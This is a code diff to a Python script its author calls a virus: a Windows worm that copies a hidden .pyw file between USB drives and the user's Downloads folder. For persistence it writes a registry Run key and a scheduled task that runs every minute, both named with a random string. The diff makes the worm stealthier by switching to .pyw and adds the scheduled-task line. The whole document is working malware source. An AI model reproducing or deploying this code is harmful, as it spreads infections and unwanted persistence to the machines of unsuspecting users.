@@ -2,13 +2,12 @@ import subprocess
 import re
 import os
 import time
+import random 
+import string
 
-def the_preparation():
-    subprocess.call(f"pip install regex", shell=True)
-    time.sleep(0.2)
-    subprocess.call(f"pip install subprocess.run", shell=True)
-    time.sleep(0.2)
-
+filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 6))
+user = str(os.getenv('username'))
+        
 def check_dvcuid():
     check = subprocess.check_output(["wmic", "logicaldisk", "where", "drivetype=2", "get", "deviceid",])
     deviceid = re.search(r"\w:",str(check))
@@ -22,7 +21,7 @@ def the_infection():
             Usb = os.popen("wmic logicaldisk where drivetype=2 get deviceid").read()
             if Usb.find("DeviceID") != -1:
                user = str(os.getenv('username'))
-               subprocess.call(f"copy C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.py {check_dvcuid()}\\" , shell=True)
+               subprocess.call(f"copy C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.pyw {check_dvcuid()}\\" , shell=True)
                time.sleep(0.2)
                break
             else:
@@ -32,22 +31,21 @@ def the_virus():
     while True:
             Usb = os.popen("wmic logicaldisk where drivetype=2 get deviceid").read()
             if Usb.find("DeviceID") != -1:
-               user = str(os.getenv('username'))
-               subprocess.call(f"copy {check_dvcuid()}\\QmlnQm94VlBT.py C:\\Users\\{user}\\Downloads" , shell=True)
+               subprocess.call(f"copy {check_dvcuid()}\\QmlnQm94VlBT.pyw C:\\Users\\{user}\\Downloads" , shell=True)
                time.sleep(0.2)
-               subprocess.call(f"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run  /v persistence  /t REG_SZ  /d C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.py ", shell=True)
+               subprocess.call(f" reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run  /v {filename}  /t REG_SZ  /d C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.pyw ", shell=True)
+               time.sleep(0.2)
+               subprocess.call(f"schtasks /create /sc minute /mo 1 /tn {filename} /tr C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.pyw ", shell=True)
                break
             else:
                time.sleep(0.2)
 
       
 def logic():
-    user = str(os.getenv('username'))
-    check_1 = subprocess.check_output(f'powershell "Test-Path {check_dvcuid()}\\QmlnQm94VlBT.py"' , shell=True)
-    check_2 = subprocess.check_output(f'powershell "Test-Path C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.py"' , shell=True)
+    check_1 = subprocess.check_output(f'powershell "Test-Path {check_dvcuid()}\\QmlnQm94VlBT.pyw"' , shell=True)
+    check_2 = subprocess.check_output(f'powershell "Test-Path C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.pyw"' , shell=True)
     value_1= "True"
     value_2= "False"
-    the_preparation()
     if value_2 in str(check_2):
        the_virus()
        time.sleep(0.2)
@@ -55,7 +53,9 @@ def logic():
             the_infection()
     elif value_2 in str(check_1)and value_1 in str(check_2):
         the_infection()
-logic()
+
+if __name__ == '__main__':
+    logic()
                    
       
                   
